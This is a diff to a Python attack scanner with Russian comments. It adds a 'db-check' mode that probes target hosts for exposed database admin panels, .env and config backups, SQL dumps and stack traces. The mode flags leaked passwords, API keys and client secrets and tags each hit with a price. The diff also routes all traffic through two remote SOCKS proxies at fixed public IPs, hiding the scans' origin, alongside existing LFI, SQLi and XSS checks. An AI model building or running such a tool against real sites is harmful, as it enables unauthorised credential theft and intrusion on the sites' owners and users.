@@ -19,6 +19,7 @@ urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 FLAG_LFI = "--lfi" in sys.argv
 FLAG_SQLI = "--sqli" in sys.argv
 FLAG_XSS = "--xss" in sys.argv
+FLAG_DBCHECK = "--db-check" in sys.argv
 FLAG_KIRPICH = "--kirpich" in sys.argv
 FLAG_DOWNLOAD = "--download" in sys.argv
 FLAG_ALIVE = "--alive" in sys.argv
@@ -95,8 +96,8 @@ def _parse_hosts():
 HOSTS = _parse_hosts()
 
 PROXIES = [
-    {"http": "socks5h://127.0.0.1:1080", "https": "socks5h://127.0.0.1:1080"},
-    {"http": "http://127.0.0.1:8081", "https": "http://127.0.0.1:8081"},
+    {"http": "socks5h://101.36.104.239:10808", "https": "socks5h://101.36.104.239:10808"},
+    {"http": "socks5h://101.36.104.46:10808", "https": "socks5h://101.36.104.46:10808"},
 ]
 
 def _fresh_proxies():
@@ -394,6 +395,39 @@ def xss_check(host, url):
                         break
     return hits
 
+def db_check(host, scheme="https"):
+    """Проверка на CRITICAL/HIGH ошибки: открытые панели БД, .env, бэкапы БД, stack trace.
+    Только GET через прокси. Возвращает список находок (path, code, category, price)."""
+    PANEL_PATHS = ("/phpmyadmin", "/phpmyadmin/", "/pma", "/adminer.php", "/adminer", "/dbadmin", "/myadmin", "/db", "/db/")
+    ENV_PATHS = ("/.env", "/.env.production", "/.env.local", "/.env.backup", "/wp-config.php.bak", "/wp-config.php~", "/config.php.bak")
+    BACKUP_PATHS = ("/backup.sql", "/db.sql", "/dump.sql", "/database.sql", "/db_backup.sql", "/backup.zip", "/backup/db.sql")
+    PANEL_HINTS = ("phpmyadmin", "adminer", "pma_", "server: mysql", "db administration")
+    ENV_HINTS = ("db_", "database_url", "database_password", "db_password", "app_key", "secret_key", "api_key", "client_secret", "smtp_pass", "password=")
+    TRACE_HINTS = ("fatal error", "stack trace", "on line ", "warning:", "uncaught", "exception", "undefined index", "deprecated:")
+    hits = []
+    for path in PANEL_PATHS + ENV_PATHS + BACKUP_PATHS:
+        st, ct, body = fetch(f"{scheme}://{host}{path}", host)
+        if st not in (200, 301, 302):
+            continue
+        if not body:
+            continue
+        low = body.lower()
+        # SPA-fallback или редирект — не находка
+        if len(low) < 60 or "<div id=\"root\"" in low or "<html" in low[:100] and "doctype" in low[:30]:
+            if "phpmyadmin" not in low and "adminer" not in low:
+                continue
+        found = None
+        if any(h in low for h in PANEL_HINTS):
+            found = ("PANEL", "$$$$")
+        elif path.startswith("/.") and any(h in low for h in ENV_HINTS) and "=" in low:
+            found = ("ENV", "$$$$")
+        elif any(h in low for h in TRACE_HINTS):
+            found = ("TRACE", "$$$")
+        if found:
+            hits.append((path, st, found[0], found[1]))
+            print(f"[DB-HIT] {host}{path} -> {st} {found[0]} {found[1]}", flush=True)
+    return hits
+
 def main():
     target_name = HOSTS[0].replace(".com", "").replace(".pl", "").replace(".net", "").replace(".io", "").replace(".", "_")
     out_urls = f"/root/office/output/{target_name}_spider_urls.txt"
@@ -506,9 +540,27 @@ def main():
         print("\n=== XSS: пропущено — URL с параметрами не найдены ===", flush=True)
     xss_out = f"/root/office/output/{target_name}_xss.txt"
     with open(xss_out, "w") as f:
-        f.write(f"# XSS-проверка паука, {time.strftime('%Y-%m-%d %H:%M')}, хостов={len(HOSTS)}, кандидатов={len(xss_cands) if FLAG_XSS else 0}\n")
-        for hit in xss_hits:
-            f.write(f"{hit[0]} | param={hit[1]} payload={hit[2]} code={hit[3]} ind={hit[4]}\n")
+         f.write(f"# XSS-проверка паука, {time.strftime('%Y-%m-%d %H:%M')}, хостов={len(HOSTS)}, кандидатов={len(xss_cands) if FLAG_XSS else 0}\n")
+         for hit in xss_hits:
+             f.write(f"{hit[0]} | param={hit[1]} payload={hit[2]} code={hit[3]} ind={hit[4]}\n")
+    # DB-CHECK: панели БД / .env / бэкапы / stack trace (CRITICAL/HIGH)
+    db_hits = []
+    if FLAG_DBCHECK:
+        print(f"\n=== DB-CHECK (панели БД / .env / бэкапы / trace, хостов={len(HOSTS)}) ===", flush=True)
+        with cf.ThreadPoolExecutor(max_workers=MAX_WORKERS) as ex:
+            futs = {ex.submit(db_check, h): h for h in HOSTS}
+            for fu in cf.as_completed(futs):
+                h = futs[fu]
+                try:
+                    db_hits.extend([(h, *x) for x in fu.result()])
+                except Exception:
+                    pass
+        db_out = f"/root/office/output/{target_name}_dbcheck.txt"
+        with open(db_out, "w") as f:
+            f.write(f"# DB-CHECK {time.strftime('%Y-%m-%d %H:%M')}, хостов={len(HOSTS)}\n")
+            for hit in db_hits:
+                f.write(f"{hit[0]}{hit[1]} | {hit[2]} | {hit[3]} | {hit[4]}\n")
+        print(f"[DB-CHECK] найдено ценного: {len(db_hits)}")
     # Кирпич: шифрование результатов age-ключом проекта
     if FLAG_KIRPICH:
         for f_ in (out_urls, out_js, out_forms, lfi_out, sqli_out, xss_out):
